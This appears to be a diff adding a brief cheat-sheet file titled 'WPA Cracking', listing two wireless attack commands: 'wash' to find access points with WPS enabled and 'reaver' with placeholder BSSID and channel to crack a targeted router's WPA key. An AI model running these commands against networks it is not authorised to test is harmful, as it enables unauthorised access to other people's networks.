@@ -1,0 +1,5 @@
+WPA Cracking
+
+
+wash -i wlan0mon - Lists all access points that support WPS key
+reaver -b (BSSID) -c (CHANNEL) -i wlan0mon - Attempts to crack targeted WPA router
